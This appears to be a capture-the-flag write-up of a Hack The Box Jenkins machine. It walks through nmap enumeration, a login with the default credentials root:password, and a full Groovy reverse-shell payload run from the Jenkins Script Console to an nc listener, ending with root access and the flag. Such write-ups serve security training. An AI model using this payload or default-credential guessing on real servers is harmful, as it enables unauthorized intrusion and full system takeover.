#common-applications #jenkins #java #reconnaissance #remote-code-execution #default-credentials 

# 0. Theory

In the cyber security industry, there is a way to identify, define, and catalog publicly disclosed vulnerabilities. That type of identification is called a CVE, which stands for Common Vulnerabilities and Exposures.

Post-analysis, each vulnerability is assigned a severity rating, called a CVSS score, ranging from 0 to 10, where 0 is considered Informational, and 10 is Critical. These scores are dependent on several factors, some of which being the level of CIA Triad compromise (Confidentiality, Integrity, Availability), the level of attack complexity, the size of the attack surface, and others.

One of the most well-known and most feared vulnerability types to find on your system is called an Arbitrary Remote Command Execution vulnerability.

	In computer security, arbitrary code execution (ACE) is an attacker's ability to execute arbitrary commands or code on a target machine or in a target process. [..] A program designed to exploit such a vulnerability is called an arbitrary code execution exploit. The ability to trigger arbitrary code execution over a network (primarily via a wide-area network such as the Internet) is often called remote code execution (RCE).

# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-xqktfghrly]─[~]
	└──╼ [★]$ ping 10.129.97.121 -c 4
	PING 10.129.97.121 (10.129.97.121) 56(84) bytes of data.
	64 bytes from 10.129.97.121: icmp_seq=1 ttl=63 time=7.95 ms
	64 bytes from 10.129.97.121: icmp_seq=2 ttl=63 time=8.16 ms
	64 bytes from 10.129.97.121: icmp_seq=3 ttl=63 time=8.31 ms
	64 bytes from 10.129.97.121: icmp_seq=4 ttl=63 time=8.22 ms
	
	--- 10.129.97.121 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3002ms
	rtt min/avg/max/mdev = 7.946/8.156/8.305/0.132 ms


# 2. Enumeration

Starting off with a usual nmap scan, we find `port 8080 TCP` open, being used by an `HTTP` service, `Jetty 9.4.39.v20210325`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-xqktfghrly]─[~]
	└──╼ [★]$ nmap 10.129.97.121 -sC -sV
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 14:09 CDT
	Nmap scan report for 10.129.97.121
	Host is up (0.0094s latency).
	Not shown: 999 closed tcp ports (reset)
	PORT     STATE SERVICE VERSION
	8080/tcp open  http    Jetty 9.4.39.v20210325
	|_http-title: Site doesn't have a title (text/html;charset=utf-8).
	|_http-server-header: Jetty(9.4.39.v20210325)
	| http-robots.txt: 1 disallowed entry 
	|_/
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.13 seconds


By checking the running service in the browser, we can see that it is a running Jenkins service.

>*Jenkins is a free and open-source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and delivery. It is a server-based system.*

As with all login screens, we can try logging in using commonly used weak credential pairs. Administrators often overlook configuring such services after setting them up.
After searching the web for common weak credential pairs, we get the following result:

	admin:password
	admin:admin
	root:root
	root:password
	admin:admin1
	admin:password1
	root:password1

And we are in with the credential pair `root:password`.
We are presented with the administrative panel for the Jenkins service. Let's look around.

![[Pasted image 20240918212115.png]]


# 3. Foothold

At the bottom right corner of the page, the current version of the Jenkins service is displayed. This is one of the first clues an attacker will check - specifically if the currently installed version has any known CVE's or attack methods published on the Internet.
Unfortunately, this is not the case here; the current version is reported as secure.
As an alternative, we stumble across two vital pieces of information while searching for Jenkins exposures.

- [A handbook including multiple ways of gaining Jenkins RCEs](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)
- [A repository similar to the above, including links to scripts and tools](https://github.com/gquere/pwn_jenkins)

In both links provided above the Jenkins Script Console is mentioned, where what is known as Groovy script can be written and run arbitrarily. To access it, we need to navigate to the left menu, to `Manage Jenkins > Script Console`, or by visiting the following URL directly from the browser URL search bar:

	http://{target_ip}:8080/script

The objective of our Groovy script implementation as explained in the two documents linked before will be to receive a reverse shell connection from the target.

Since it only executes the Groovy commands, we will need to create a payload in Groovy to execute the reverse shell connection. Specifically, we will make the remote server connect to us by specifying our IP address and the port that we will listen on for new connections. Through that listening port, the target will end up sending us a connection request, which our host will accept, forming an interactive shell with control over the target's backend system. In order to do that, we will need a specially crafted payload, which we can find in [the following GitHub cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).

After checking our attacker VM's IP address, we just need to replace the placeholder in the beginning of the following script with it, and we can paste it right into the Jenkins Script Console to execute it (`ip a` command):

	ip a | grep tun0

(Or, alternatively, `ifconfig`.)

	String host="{your_IP}";
	int port=8000; String cmd="/bin/bash";
	Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);
	InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
	 OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
	  while(si.available()>0)po.write(si.read());so.flush();po.flush();
	  Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();
	s.close();

The third line opens a bash terminal, because the target is Linux-based. In case the target would be a Windows machine, we would need to use `cmd.exe` instead:
`String cmd="/bin/bash";`

The rest of the script will instruct the target to create a `cmd` process which will initialize a connection request to the provided `host` and `port` (us, in this case). Our listener script will be running on the specified port and catch the connection request from the target, successfully forming a reverse shell between the target and attacker hosts. On our side, this will look like a new connection is received and that we can now type in the target host's terminal. This will not be visible on the target's side unless they are actively monitoring the network activity of their running processes or the outbound connections from their ports.

Before running the command pasted in the Jenkins Script Console, we need to make sure our listener script is up and running on the same port as specified in the command above, for i`nt port=8000`. To do this, we will use a tool called `netcat` or `nc` for short.
[Wikipedia article for netcat](https://en.wikipedia.org/wiki/Netcat).

Netcat comes pre-installed with every Linux distribution, and in order to see how to use it, we can input the `nc -h` command into our terminal window.

We will need the following options to set up the listener on our end and start the attack (in a new terminal window):

	l : Listening mode.
	v : Verbose mode. Displays status messages in more detail.
	n : Numeric-only IP address. No hostname resolution. DNS is not being used.
	p : Port. Use to specify a particular port for listening.


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-lwakestwlv]─[~]
	└──╼ [★]$ nc -lvnp 8000
	listening on [any] 8000 ...


Once we click on the Run button at the Jenkins Script Console, we can navigate to the terminal where `netcat` is running and check on the connection state. From the output, we understand that a connection has been received to `{our_IP}` from `{target_IP}`, and then blank space. We can try to interact with the shell by typing in the `whoami` and `id` commands. These commands help verify our permission level on the target system. From the output, we can quickly determine that we rest at the highest level of privilege.


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.118]─[scrage@htb-lwakestwlv]─[~]
	└──╼ [★]$ nc -lvnp 8000
	listening on [any] 8000 ...
	connect to [10.10.14.118] from (UNKNOWN) [10.129.99.40] 49278
	whoami
	root
	id
	uid=0(root) gid=0(root) groups=0(root)

We have command execution. We navigate to the -root folder and capture the VM's flag.

	cd /root
	ls -la
	total 44
	drwx------  8 root root 4096 Jun 17  2021 .
	drwxr-xr-x 20 root root 4096 Jun 17  2021 ..
	lrwxrwxrwx  1 root root    9 Jun 17  2021 .bash_history -> /dev/null
	-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
	drwxr-xr-x  3 root root 4096 Apr 23  2021 .cache
	-r--------  1 root root   33 Mar 12  2021 flag.txt
	drwxr-xr-x  3 root root 4096 Mar 12  2021 .groovy
	drwxr-xr-x  3 root root 4096 Mar 12  2021 .java
	drwxr-xr-x  3 root root 4096 Mar 12  2021 .local
	-rw-r--r--  1 root root  161 Dec  5  2019 .profile
	drwxr-xr-x  3 root root 4096 Mar 12  2021 snap
	drwx------  2 root root 4096 Mar 12  2021 .ssh
	cat flag.txt
	9cdfb439c7876e703e307864c9167a15


Flag exfiltrated: `9cdfb439c7876e703e307864c9167a15`



https://www.hackthebox.com/achievement/machine/2057492/406
![[Pasted image 20240921165550.png]]